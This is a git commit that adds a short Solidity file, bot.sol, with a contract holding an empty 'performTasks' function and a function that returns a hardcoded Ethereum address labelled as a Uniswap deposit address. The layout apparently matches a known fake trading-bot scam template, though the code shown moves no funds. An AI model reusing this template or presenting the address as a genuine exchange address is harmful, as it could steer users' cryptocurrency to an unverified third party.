99f8c92738b4de6607f12c24515ad54af8a568f7
X2R2 <109392731+X2R2@users.noreply.github.com>
2022-07-15 18:56:33 -0400

    Create bot.sol

---
+++ bot.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+        function performTasks() public {
+   
+        }
+
+        function uniswapDepositAddres() public pure returns (address) {
+                   return 0xE780709C8a20b72463C39286aeE627b27c3A4b11;
+         }
+}  
